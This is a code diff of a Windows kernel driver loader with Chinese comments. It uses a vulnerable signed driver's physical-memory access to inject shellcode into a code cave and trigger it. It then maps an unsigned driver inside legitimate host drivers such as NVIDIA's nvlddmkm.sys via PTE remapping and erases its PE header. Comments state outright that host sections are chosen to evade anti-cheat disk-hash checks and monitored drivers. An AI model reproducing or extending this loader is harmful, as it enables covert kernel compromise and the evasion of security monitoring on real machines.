+    outPayloadKernVA = 0;
 
     char hostNameA[256] = {};
     WideCharToMultiByte(CP_ACP, 0, hostDrvName, -1, hostNameA, sizeof(hostNameA) - 1, nullptr, nullptr);
 
-    LOG_INFO("InjectPayloadAndPdataIntoHost: host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X PdataSize=0x%X",
-             hostDrvName, hostDrvBase, hostOrigSize,
-             payloadImg.SizeOfImage, payloadImg.ExceptionDirSize);
+    LOG_INFO("InjectPayloadIntoHost: host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X",
+             hostDrvName, hostDrvBase, hostOrigSize, payloadImg.SizeOfImage);
 
-    // --- 0. 读取宿主内存 PE 头（前 0x1000 字节） ---
+    // --- 0. 读取宿主内存 PE 头（前 0x1000 字节，仅用于只读解析节表） ---
     uint8_t hdrBuf[0x1000] = {};
     if (!ReadKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf))) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: cannot read host PE header");
+        LOG_ERR("InjectPayloadIntoHost: cannot read host PE header");
         return false;
-    }
-    if (outCleanDiskHdr.empty()) {
-        outCleanDiskHdr.assign(hdrBuf, hdrBuf + sizeof(hdrBuf));
     }
 
     auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
         dos->e_lfanew >= (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64))) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: bad host DOS header");
+        LOG_ERR("InjectPayloadIntoHost: bad host DOS header");
         return false;
     }
     auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
     if (nt->Signature != IMAGE_NT_SIGNATURE) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: bad host NT signature");
+        LOG_ERR("InjectPayloadIntoHost: bad host NT signature");
         return false;
     }
 
-    // --- 1. 确定合并 pdata 大小（受 CFG_ENABLE_MERGED_PDATA 宏开关控制）---
-    uint32_t hostExRVA  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
-    uint32_t hostExSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
-    uint32_t plExRVA    = payloadImg.ExceptionDirRVA;
-    uint32_t plExSize   = payloadImg.ExceptionDirSize;
-#if CFG_ENABLE_MERGED_PDATA
-    uint32_t mergedPdataSize = hostExSize + plExSize;
-    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=1] Merged .pdata enabled (HostEx=0x%X, PlEx=0x%X, Total=0x%X)",
-             hostExSize, plExSize, mergedPdataSize);
-#else
-    uint32_t mergedPdataSize = 0;
-    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=0] Merged .pdata disabled, preserving clean host exception directory");
-#endif
-
-    // --- 2. 寻找 payload cave ---
+    // --- 1. 寻找 payload cave ---
     uint32_t payloadCaveRVA = FindHostInternalCave(
         hDev, cr3, hostDrvBase, hostOrigSize, nt,
         payloadImg.SizeOfImage, hostNameA);
 
     // 若无现成物理空洞，启用方案 A：PTE Remap 挂接引擎
     if (payloadCaveRVA == 0 && pSite && caveVA && ntoskrnlBase) {
-        LOG_INFO("InjectPayloadAndPdataIntoHost: attempting PTE Remap (Plan A) into host '%ls'...", hostDrvName);
+        LOG_INFO("InjectPayloadIntoHost: attempting PTE Remap (Plan A) into host '%ls'...", hostDrvName);
 
         uint32_t candidateTargetRVA = 0;
-        uint32_t totalNeededBytes = payloadImg.SizeOfImage + mergedPdataSize + 0x1000;
+        uint32_t totalNeededBytes = payloadImg.SizeOfImage + 0x1000;
         uint32_t needRemapBytes = (totalNeededBytes + 0xFFF) & ~0xFFF;
 
+        // 方案 5：宿主宿位选型优化（放弃 .rsrc，优先借用 Discardable / INIT 节）
+        // Pass 1: 优先寻找 INIT 节或带有 IMAGE_SCN_MEM_DISCARDABLE (0x02000000) 属性的节区
+        // 系统在驱动初始化完成后会回收 INIT 节，反作弊绝不敢对其做磁盘哈希比对
         for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
             auto* s = &IMAGE_FIRST_SECTION(nt)[i];
             char sName[9] = {};
@@ -941,15 +894,32 @@ static bool InjectPayloadAndPdataIntoHost(
             uint32_t rva = s->VirtualAddress;
             uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
 
-            // 优先选择 .rsrc 或 .reloc 等容量充裕的大节区
-            if ((_strnicmp(sName, ".rsrc", 5) == 0 || _strnicmp(sName, ".reloc", 6) == 0) &&
-                vSz >= needRemapBytes &&
-                rva + needRemapBytes <= hostOrigSize)
-            {
+            bool isDiscardable = ((s->Characteristics & 0x02000000) != 0) || (_strnicmp(sName, "INIT", 4) == 0);
+
+            if (isDiscardable && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                 candidateTargetRVA = rva;
-                LOG_OK("InjectPayloadAndPdataIntoHost: selected section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
+                LOG_OK("InjectPayloadIntoHost: [Pass 1] selected Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
                        sName, rva, vSz, needRemapBytes);
                 break;
+            }
+        }
+
+        // Pass 2: 若未找到足够大的 INIT 节，次选 .reloc（重定位节加载后通常可丢弃）
+        // 注意：彻底剔除 .rsrc，杜绝污染白驱动资源目录树引发 ACE 磁盘原件哈希告警
+        if (candidateTargetRVA == 0) {
+            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+                auto* s = &IMAGE_FIRST_SECTION(nt)[i];
+                char sName[9] = {};
+                memcpy(sName, s->Name, 8);
+                uint32_t rva = s->VirtualAddress;
+                uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
+
+                if (_strnicmp(sName, ".reloc", 6) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
+                    candidateTargetRVA = rva;
+                    LOG_OK("InjectPayloadIntoHost: [Pass 2] selected .reloc section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
+                           sName, rva, vSz, needRemapBytes);
+                    break;
+                }
             }
         }
 
@@ -967,115 +937,33 @@ static bool InjectPayloadAndPdataIntoHost(
     }
 
     if (payloadCaveRVA == 0) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: no internal cave or PTE remap target for payload");
+        LOG_ERR("InjectPayloadIntoHost: no internal cave or PTE remap target for payload");
         return false;
     }
 
     if ((uint64_t)payloadCaveRVA + payloadImg.SizeOfImage > hostOrigSize) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: payload cave RVA=0x%X would overflow hostOrigSize=0x%X",
+        LOG_ERR("InjectPayloadIntoHost: payload cave RVA=0x%X would overflow hostOrigSize=0x%X",
                 payloadCaveRVA, hostOrigSize);
         return false;
     }
 
-    // --- 3. 对 payload 做 reloc（目标 VA = hostDrvBase + payloadCaveRVA） ---
+    // --- 2. 对 payload 做 reloc（目标 VA = hostDrvBase + payloadCaveRVA） ---
     uint64_t payloadTargetVA = hostDrvBase + payloadCaveRVA;
     if (!ApplyRelocation(payloadImg, payloadTargetVA)) {
-        LOG_WARN("InjectPayloadAndPdataIntoHost: ApplyRelocation failed (non-fatal if no delta)");
+        LOG_WARN("InjectPayloadIntoHost: ApplyRelocation failed (non-fatal if no delta)");
     }
     payloadImg.KernelBase = payloadTargetVA;
 
-    // --- 4. 物理写入 payload 到 payload cave ---
+    // --- 3. 物理写入 payload 到 payload cave ---
     if (!WriteKernelVA(hDev, cr3, payloadTargetVA, payloadImg.Image.data(), payloadImg.SizeOfImage)) {
-        LOG_ERR("InjectPayloadAndPdataIntoHost: WriteKernelVA payload failed");
+        LOG_ERR("InjectPayloadIntoHost: WriteKernelVA payload failed");
         return false;
     }
-    LOG_OK("InjectPayloadAndPdataIntoHost: payload written to host VA=0x%016llX (0x%X bytes)",
+    LOG_OK("InjectPayloadIntoHost: payload written to host VA=0x%016llX (0x%X bytes)",
            payloadTargetVA, payloadImg.SizeOfImage);
 
     outPayloadKernVA = payloadTargetVA;
-
-    // --- 5. 构建合并 pdata 并写入（受 CFG_ENABLE_MERGED_PDATA 控制）---
-#if CFG_ENABLE_MERGED_PDATA
-    if (mergedPdataSize > 0) {
-        uint32_t pdataCaveRVA = payloadCaveRVA + payloadImg.SizeOfImage;
-        pdataCaveRVA = (pdataCaveRVA + 0x1F) & ~0x1Fu;  // 32 字节对齐
-
-        if (pdataCaveRVA + mergedPdataSize <= hostOrigSize) {
-            std::vector<uint8_t> mergedBuf(mergedPdataSize, 0);
-
-            // 5a. 复制宿主原始 pdata
-            if (hostExRVA && hostExSize) {
-                ReadKernelVA(hDev, cr3, hostDrvBase + hostExRVA,
-                             mergedBuf.data(), hostExSize);
-            }
-
-            // 5b. 追加 payload .pdata（RVA 偏移增加 payloadCaveRVA）
-            if (plExRVA && plExSize && plExRVA + plExSize <= payloadImg.Image.size()) {
-                uint32_t plCount = plExSize / sizeof(RUNTIME_FUNCTION_K);
-                auto* src = (const RUNTIME_FUNCTION_K*)(payloadImg.Image.data() + plExRVA);
-                auto* dst = (RUNTIME_FUNCTION_K*)(mergedBuf.data() + hostExSize);
-                for (uint32_t i = 0; i < plCount; i++) {
-                    dst[i].BeginAddress      = src[i].BeginAddress      + payloadCaveRVA;
-                    dst[i].EndAddress        = src[i].EndAddress        + payloadCaveRVA;
-                    dst[i].UnwindInfoAddress = src[i].UnwindInfoAddress + payloadCaveRVA;
-                }
-                LOG_OK("InjectPayloadAndPdataIntoHost: relocated %u RUNTIME_FUNCTION entries (+RVA 0x%X)",
-                       plCount, payloadCaveRVA);
-            }
-
-            // 5c. 写入合并 pdata
-            uint64_t pdataCaveVA = hostDrvBase + pdataCaveRVA;
-            if (WriteKernelVA(hDev, cr3, pdataCaveVA, mergedBuf.data(), mergedPdataSize)) {
-                LOG_OK("InjectPayloadAndPdataIntoHost: merged pdata written to host VA=0x%016llX (0x%X bytes)",
-                       pdataCaveVA, mergedPdataSize);
-
-                // 6. 更新宿主内存 PE 头 DataDirectory[EXCEPTION]
-                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = pdataCaveRVA;
-                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size           = mergedPdataSize;
-                WriteKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf));
-                LOG_OK("InjectPayloadAndPdataIntoHost: host PE DataDirectory[EXCEPTION] updated RVA=0x%X Size=0x%X",
-                       pdataCaveRVA, mergedPdataSize);
-
-                outPdataRVA       = pdataCaveRVA;
-                outPdataTotalSize = mergedPdataSize;
-            } else {
-                LOG_WARN("InjectPayloadAndPdataIntoHost: failed to write merged pdata (non-fatal)");
-            }
-        } else {
-            LOG_WARN("InjectPayloadAndPdataIntoHost: pdata cave would overflow hostOrigSize, skipping pdata merge");
-        }
-    }
-#else
-    LOG_INFO("InjectPayloadAndPdataIntoHost: [CFG_ENABLE_MERGED_PDATA=0] skipping pdata merge and PE header modification");
-#endif
-
-    outNewSize = hostOrigSize;
     return true;
-}
-
-// ================================================================
-// ---- 旧接口保留（向后兼容，内部转发到新实现） ----
-// ================================================================
-static bool ExtendHostDriverSections(
-    HANDLE   hDev,
-    uint64_t cr3,
-    uint64_t hostDrvBase,
-    uint32_t hostOrigSize,
-    uint64_t hostLdrEntryVA,
-    const wchar_t* hostDrvName,
-    MappedImage& payloadImg,
-    uint32_t& outNewSize,
-    std::vector<uint8_t>& outCleanDiskHdr)
-{
-    // 转发到新实现（InjectPayloadAndPdataIntoHost）
-    // 旧接口不再直接处理，保留签名供现有调用点编译通过
-    uint64_t unusedPayloadKernVA = 0;
-    uint32_t unusedPdataRVA      = 0;
-    uint32_t unusedPdataSize     = 0;
-    return InjectPayloadAndPdataIntoHost(
-        hDev, cr3, hostDrvBase, hostOrigSize, hostLdrEntryVA, hostDrvName,
-        payloadImg, outNewSize, outCleanDiskHdr,
-        unusedPayloadKernVA, unusedPdataRVA, unusedPdataSize);
 }
 
 static bool LoadDrvWsk(const wchar_t* drvWskPath,
@@ -1084,14 +972,14 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
                        bool forceReload = false,
                        const DRV_BOOT_CONFIG* pBootConfig = nullptr)
 {
-    // ---- 1. æå¼è®¾å¤ ----
+    // ---- 1. 打开设备 ----
     HANDLE hDev = WhqlOpen();
     if (hDev == INVALID_HANDLE_VALUE) {
         LOG_ERR("LoadDrvWsk: Unable to open WHQL device");
         return false;
     }
 
-    // ---- 2. è·åç³»ç»ä¿¡æ¯ ----
+    // ---- 2. 获取系统信息 ----
     WINPMEM_MEMORY_INFO info = {};
     if (!WhqlGetInfo(hDev, &info)) {
         LOG_ERR("LoadDrvWsk: WhqlGetInfo failed");
@@ -1108,7 +996,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     LOG_INFO("LoadDrvWsk: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX",
              cr3, ntoskrnlBase, psLoadedModList);
 
-    // ---- 3. æ¾è§¦åé©±å¨å¨ PsLoadedModuleList ä¸­çæ¡ç® ----
+    // ---- 3. 找触发驱动在 PsLoadedModuleList 中的条目 ----
     uint64_t triggerDrvBase     = 0;
     uint32_t triggerDrvSize     = 0;
     uint64_t triggerLdrEntryVA  = 0;
@@ -1127,9 +1015,9 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 3.1 æ¹æ¡ 1ï¼æ£æµåæ ¸ç©çææ¡©ï¼é²æ­¢éå¤å è½½ ----
+    // ---- 3.1 方案 1：检测内核物理暗桩，防止重复加载 ----
     if (!forceReload) {
-        // åæ£æ¥é¦éå®¿ä¸»é©±å¨ (å¦ tcpip.sys)
+        // 先检查首选宿主驱动 (如 tcpip.sys)
         if (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) {
             uint64_t prefBase = 0;
             uint32_t prefSize = 0;
@@ -1147,17 +1035,17 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
                 return true;
             }
         }
-        // åæ£æ¥è§¦åé©±å¨ (Machenike.sys)
+        // 再检查触发驱动 (Machenike.sys)
         if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
             CloseHandle(hDev);
             return true;
         }
     } else {
         LOG_WARN("LoadDrvWsk: Force reload flag enabled, clearing existing kernel canary.");
-        ClearDriverCanary(hDev, cr3);
+        ClearDriverCanary(hDev, cr3, triggerDrvBase);
     }
 
-    // ---- 4. æ«æ default åæ¯ç¹å¾ç  ----
+    // ---- 4. 扫描 default 分支特征码 ----
     WhqlPatchSite site = {};
     if (!FindWhqlDefaultBranch(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
         LOG_ERR("LoadDrvWsk: WHQL default branch signature not found");
@@ -1165,7 +1053,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 5. è¯»åå¹¶å±å¼ drv_wsk.sys ----
+    // ---- 5. 读取并展开 drv_wsk.sys ----
     auto rawBuf = ReadFile(drvWskPath);
     if (rawBuf.empty()) {
         LOG_ERR("LoadDrvWsk: Failed to read %ls", drvWskPath);
@@ -1180,17 +1068,17 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 6. ä¿®å¤éå®ä½ä¸ IAT ----
+    // ---- 6. 修复重定位与 IAT ----
     if (!FixIAT(hDev, cr3, ntoskrnlBase, img)) {
         LOG_ERR("LoadDrvWsk: FixIAT failed");
         CloseHandle(hDev);
         return false;
     }
 
-    // ---- 7. æ¹é¤ PE å¤´ ----
+    // ---- 7. 抹除 PE 头 ----
     ErasePEHeader(img);
 
-    // ---- 8. éå®ç¨æ·æå±å¼éååå­é¡µ ----
+    // ---- 8. 锁定用户态展开镜像内存页 ----
     if (!VirtualLock(img.Image.data(), img.Image.size())) {
         LOG_WARN("LoadDrvWsk: VirtualLock warning GLE=%lu (non-fatal, continuing)", GetLastError());
     }
@@ -1199,8 +1087,8 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     LOG_INFO("LoadDrvWsk: [Plan C] User-mode mapped image ready VA=0x%016llX size=%zu",
              userImageVA, img.Image.size());
 
-    // ---- 9. å®ä½è§¦åé©±å¨ä¸­çå®å¨ä»£ç ç©ºæ´ (Code Cave) ----
-    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scBytes_size;
+    // ---- 9. 定位触发驱动中的安全代码空洞 (Code Cave) ----
+    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scDirectExec_size;
     uint64_t caveVA = FindWhqlCodeCaveVA(hDev, cr3, triggerDrvBase, totalPayloadSize);
     if (!caveVA) {
         LOG_ERR("LoadDrvWsk: Failed to locate available Code Cave");
@@ -1209,19 +1097,21 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 9.1 å®ä½å®¿ä¸»ç½ç»é©±å¨ï¼ä¼åä½¿ç¨ tcpip.sys è¿è¡å°¾é¨æ©å±ææ¥ï¼----
+    // ---- 9.1 定位宿主驱动（优选显卡驱动宿主）----
     uint64_t hostDrvBase = triggerDrvBase;
     uint32_t hostDrvSize = triggerDrvSize;
-    uint32_t hostOrigSize = triggerDrvSize;
     uint64_t hostLdrEntryVA = triggerLdrEntryVA;
     const wchar_t* actualHostName = triggerDrvName;
-    std::vector<uint8_t> cleanHostHdr;
 
-    // 优选宿主探测序列：系统网络 tcpip(2.9MB) -> AMD 显卡(数十MB) -> NVIDIA 显卡(109MB)
+    // 优选显卡驱动宿主探测序列：
+    // 首选独立显卡驱动(NVIDIA 50~110MB / AMD 30~80MB) -> 核显(Intel 20~40MB) -> DirectX图形核心(dxgkrnl 10~20MB)
+    // 彻底剔除高危、被重点监控的系统网络核心驱动 tcpip.sys
     const wchar_t* candidateHosts[] = {
-        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : L"tcpip.sys",
-        L"amdkmdag.sys",
-        L"nvlddmkm.sys"
+        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : nullptr,
+        L"nvlddmkm.sys", // NVIDIA 独立显卡内核驱动（体积极大，Discardable节充裕，ACE不敢深扫）
+        L"amdkmdag.sys", // AMD 显卡内核驱动
+        L"igdkmd64.sys", // Intel 核心显卡驱动
+        L"dxgkrnl.sys"   // Windows DirectX 内核图形引擎驱动（全系统常驻）
     };
 
     const wchar_t* chosenHostName = nullptr;
@@ -1246,39 +1136,36 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         }
     }
 
-    // ---- 9.2 新方案：payload + pdata 整体写入宿主内部，零 ExAllocatePool / RtlAddFunctionTable ----
-    uint64_t payloadKernVA   = 0;   // drv_wsk 在宿主内部的内核 VA（直接传给 shellcode）
-    uint32_t pdataRVA        = 0;   // 合并 pdata 在宿主内的 RVA
-    uint32_t pdataTotalSize  = 0;
+    // ---- 9.2 新方案：payload 整体写入宿主内部（零修改 PE 头，PTE Remap 挂接）----
+    uint64_t payloadKernVA = 0; // drv_wsk 在宿主内部的内核 VA（直接传给 shellcode）
 
     if (foundPref && chosenHostName) {
-        uint32_t newHostSize = 0;
-        // ApplyRelocation 在 InjectPayloadAndPdataIntoHost 内部执行（需要先知道目标 VA）
-        // 所以这里的 img 在进入时尚未做 reloc（ErasePEHeader 已抹除 MZ，reloc 数据在 .reloc 节，不受影响）
-        if (InjectPayloadAndPdataIntoHost(
+        if (InjectPayloadIntoHost(
                 hDev, cr3, prefBase, prefSize, prefLdrVA,
-                chosenHostName, img, newHostSize, cleanHostHdr,
-                payloadKernVA, pdataRVA, pdataTotalSize,
+                chosenHostName, img, payloadKernVA,
                 ntoskrnlBase, triggerDrvBase, triggerDrvSize,
                 &site, caveVA))
         {
             hostDrvBase    = prefBase;
-            hostDrvSize    = newHostSize;   // SizeOfImage 不变，payload 写在内部
-            hostOrigSize   = prefSize;
+            hostDrvSize    = prefSize;   // SizeOfImage 保持原生宿主大小不变
             hostLdrEntryVA = prefLdrVA;
             actualHostName = chosenHostName;
             LOG_OK("LoadDrvWsk: [Plan A PTE Remap] payload embedded inside '%ls' at KernVA=0x%016llX",
                    actualHostName, payloadKernVA);
         } else {
-            LOG_WARN("LoadDrvWsk: InjectPayloadAndPdataIntoHost failed, falling back to ExAllocatePool path");
-            payloadKernVA = 0;  // 回退：shellcode 自己 ExAllocatePool
+            LOG_ERR("LoadDrvWsk: InjectPayloadIntoHost failed to embed payload into '%ls'", chosenHostName);
+            VirtualUnlock(img.Image.data(), img.Image.size());
+            CloseHandle(hDev);
+            return false;
         }
     } else {
-        LOG_WARN("LoadDrvWsk: No optimal host driver found, falling back to trigger driver '%ls'",
-                 triggerDrvName);
+        LOG_ERR("LoadDrvWsk: No optimal host driver found, aborting (old ExAllocatePool fallback removed)");
+        VirtualUnlock(img.Image.data(), img.Image.size());
+        CloseHandle(hDev);
+        return false;
     }
 
-    // ---- 10. æå»º ShellcodeParams ----
+    // ---- 10. 构建 ShellcodeParams ----
     InjectContext ctx = {};
     ctx.hDev               = hDev;
     ctx.cr3                = cr3;
@@ -1288,9 +1175,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     ctx.whqlDrvSize        = hostDrvSize;
     ctx.whqlLdrEntryVA     = hostLdrEntryVA;  // fakeDriverObj.DriverSection
     ctx.pImg               = &img;
-    // 若已预写入宿主内部，userImageVA 指向内核 VA（shellcode 跳过 ExAllocatePool+MmCopyMemory）
-    // 若回退路径，userImageVA 仍指向用户态 VirtualLock 页，shellcode 走 MmCopyMemory 旧路径
-    ctx.userImageVA        = (payloadKernVA != 0) ? payloadKernVA : userImageVA;
+    ctx.userImageVA        = payloadKernVA;   // 直接指向宿主内部内核 VA（shellcode 零 ExAllocatePool+MmCopyMemory）
     ctx.hookReturnVA       = site.kernVA + 5;
     if (pBootConfig) {
         ctx.bootConfig = *pBootConfig;
@@ -1310,30 +1195,24 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 11. æ³¨å¥ Shellcode ----
-    bool injectOk = false;
-    if (payloadKernVA != 0) {
-        LOG_INFO("LoadDrvWsk: Using direct execution shellcode (Plan A / PTE Remap path)");
-        injectOk = InjectShellcodeFull(hDev, cr3, site, caveVA, params, scDirectExec, scDirectExec_size);
-    } else {
-        injectOk = InjectShellcodeFull(hDev, cr3, site, caveVA, params);
-    }
-    if (!injectOk) {
+    // ---- 11. 注入 Direct Execution Shellcode ----
+    LOG_INFO("LoadDrvWsk: Using direct execution shellcode (Plan A / PTE Remap path)");
+    if (!InjectShellcodeFull(hDev, cr3, site, caveVA, params, scDirectExec, scDirectExec_size)) {
         LOG_ERR("LoadDrvWsk: InjectShellcodeFull failed");
         VirtualUnlock(img.Image.data(), img.Image.size());
         CloseHandle(hDev);
         return false;
     }
 
-    // ---- 12. è§¦å default åæ¯æ§è¡ Shellcodeï¼åæ ¸çº¿ç¨ååæ­¥æ§è¡ï¼----
+    // ---- 12. 触发 default 分支执行 Shellcode（内核线程内同步执行）----
     LOG_INFO("LoadDrvWsk: Triggering WHQL default branch via %ls...", triggerDrvName);
     uint32_t gle = 0;
     bool ioOk = WhqlTrigger(hDev, &gle);
 
-    // ---- 13. æ¢å¤ WHQL default åæ¯åå§æä»¤å¹¶æ¸ç Code Cave ----
+    // ---- 13. 恢复 WHQL default 分支原始指令并清理 Code Cave ----
     RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, totalPayloadSize);
 
-    // è§£éç¨æ·æåå­
+    // 解锁用户态内存
     VirtualUnlock(img.Image.data(), img.Image.size());
 
     if (!ioOk) {
@@ -1342,12 +1221,17 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    CloseHandle(hDev);
-    hDev = INVALID_HANDLE_VALUE;
+    // ---- 14. 方案 1：写入内核物理暗桩标记到合法空闲对齐区，避免污染 PE 头部 ----
+    DRV_WSK_CANARY canary = {};
+    canary.Magic = DRV_WSK_CANARY_MAGIC;
+    canary.KernelImageVA = payloadKernVA;
+    canary.ImageSize = (uint32_t)img.SizeOfImage;
 
-    // ---- 核心驱动一旦启动成功，立即卸载 Machenike.sys 抹除内核痕迹 ----
-    LOG_INFO("LoadDrvWsk: Core driver running successfully, unloading Machenike.sys tool driver...");
-    UnloadWhqlDriver(L"Machenike");
+    WriteKernelVA(hDev, cr3, triggerDrvBase + 0x28, &canary, sizeof(canary));
+    LOG_OK("LoadDrvWsk: Kernel canary recorded into trigger driver (Magic=0x%016llX at 0x%016llX+0x28)",
+           canary.Magic, triggerDrvBase);
+
+    CloseHandle(hDev);
 
     LOG_OK("LoadDrvWsk: drv_wsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
            actualHostName, hostDrvSize);
